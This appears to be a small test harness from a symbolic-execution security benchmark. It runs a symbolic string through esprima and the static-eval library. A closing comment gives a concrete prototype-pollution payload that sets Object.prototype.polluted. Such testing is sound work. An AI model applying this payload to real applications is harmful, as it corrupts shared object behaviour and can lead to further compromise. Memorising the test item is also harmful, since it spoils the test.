const evaluate = require("static-eval");
const parse = require("esprima").parse;
const esl_symbolic = require("esl_symbolic");
var payload = esl_symbolic.string("payload");
let ast = parse(payload).body[0].expression;
let res = evaluate(ast, {});
//"(function(){1 + (Object.prototype.polluted = `yes`)}())"
